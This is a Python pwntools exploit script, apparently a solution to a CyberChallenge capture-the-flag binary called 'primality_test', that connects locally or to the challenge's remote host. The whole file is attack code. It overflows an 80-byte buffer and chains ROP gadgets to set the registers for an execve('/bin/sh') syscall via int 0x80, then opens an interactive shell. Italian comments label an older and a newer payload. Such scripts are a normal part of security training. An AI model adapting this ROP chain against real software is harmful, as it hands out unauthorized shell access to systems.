#!/usr/bin/env python3

from pwn import *

exe = ELF("./primality_test")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rop.challs.cyberchallenge.it", 9130)

    return r


def main():
    r = conn()

    # good luck pwning :)

    
    ret_addr_ebx = p32(0x08048435, endianness = 'little') # pop ebx; ret;
    ret_addr_ecx = p32(0x0804860a, endianness = 'little') # pop ecx; ret;
    ret_addr_edx = p32(0x0804860c, endianness = 'little') # pop edx; ret;
    ret_addr_eax = p32(0x08048606, endianness = 'little') # pop eax; int 0x80;
    zero_addr = p32(0x080489dd, endianness = 'little')    # 0x00

    shell_string_addr = p32(0x08048991, endianness = 'little') # -> "/bin/sh"
    tmp = 11
    syscall_id = tmp.to_bytes(4, 'little')
    tmp2 = 0
    zero = p32(0, endianness = 'little')
    print(syscall_id)
    print(zero)
    
    
    # vecchio
    payload = b'a'*80 + ret_addr_ebx + shell_string_addr + ret_addr_eax + syscall_id

    # nuovo
    payload = b'a'*80 + ret_addr_edx + zero + ret_addr_ecx + zero + ret_addr_ebx + shell_string_addr + ret_addr_eax + syscall_id

    print(payload)

    data = r.recvline()
    print(data)
    data = r.recvuntil("Enter a number: ")
    print(data)

    r.sendline(payload)

    data = r.recvline()
    print(data)



    r.interactive()


if __name__ == "__main__":
    main()
